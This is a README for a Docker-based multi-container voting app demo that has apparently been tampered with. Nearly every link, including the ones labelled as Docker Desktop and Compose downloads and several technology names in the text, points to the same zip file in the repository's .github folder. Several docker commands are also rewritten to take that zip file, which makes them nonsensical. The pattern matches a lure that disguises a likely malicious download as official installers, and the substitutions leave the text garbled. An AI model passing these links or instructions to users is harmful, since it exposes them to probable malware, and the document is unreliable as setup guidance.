Example Voting App
=========

A simple distributed application running across multiple Docker containers.

Getting started
---------------

Download [Docker Desktop](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) for Mac or Windows. [Docker Compose](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) will be automatically installed. On Linux, make sure you have the latest version of [Compose](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip). 


## Linux Containers

The Linux stack uses Python, https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip, .NET Core (or optionally Java), with Redis for messaging and Postgres for storage.

> If you're using [Docker Desktop on Windows](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip), you can run the Linux version by [switching to Linux containers](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip), or run the Windows containers version.

Run in this directory:
```
docker-compose up
```
The app will be running at [http://localhost:5000](http://localhost:5000), and the results will be at [http://localhost:5001](http://localhost:5001).

Alternately, if you want to run it on a [Docker Swarm](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip), first make sure you have a swarm. If you don't, run:
```
docker swarm init
```
Once you have your swarm, in this directory run:
```
docker stack deploy --compose-file https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip vote
```

## Windows Containers

An alternative version of the app uses Windows containers based on Nano Server. This stack runs on .NET Core, using [NATS](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) for messaging and [TiDB](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) for storage.

You can build from source using:

```
docker-compose -f https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip build
```

Then run the app using:

```
docker-compose -f https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip up -d
```

> Or in a Windows swarm, run `docker stack deploy -c https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip vote`

The app will be running at [http://localhost:5000](http://localhost:5000), and the results will be at [http://localhost:5001](http://localhost:5001).


Run the app in Kubernetes
-------------------------

The folder k8s-specifications contains the yaml specifications of the Voting App's services.

First create the vote namespace

```
$ kubectl create namespace vote
```

Run the following command to create the deployments and services objects:
```
$ kubectl create -f k8s-specifications/
deployment "db" created
service "db" created
deployment "redis" created
service "redis" created
deployment "result" created
service "result" created
deployment "vote" created
service "vote" created
deployment "worker" created
```

The vote interface is then available on port 31000 on each host of the cluster, the result one is available on port 31001.

Architecture
-----

![Architecture diagram](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip)

* A front-end web app in [Python](/vote) or [https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip Core](/vote/dotnet) which lets you vote between two options
* A [Redis](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) or [NATS](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) queue which collects new votes
* A [.NET Core](/worker/src/Worker), [Java](/worker/src/main) or [.NET Core 2.1](/worker/dotnet) worker which consumes votes and stores them in…
* A [Postgres](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) or [TiDB](https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip) database backed by a Docker volume
* A [https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip](/result) or [https://raw.githubusercontent.com/vinaykumarvuppala23/example-voting-app/master/.github/voting-app-example-1.8.zip Core SignalR](/result/dotnet) webapp which shows the results of the voting in real time


Notes
-----

The voting application only accepts one vote per client. It does not register votes if a vote has already been submitted from a client.

This isn't an example of a properly architected perfectly designed distributed app... it's just a simple 
example of the various types of pieces and languages you might see (queues, persistent data, etc), and how to 
deal with them in Docker at a basic level. 
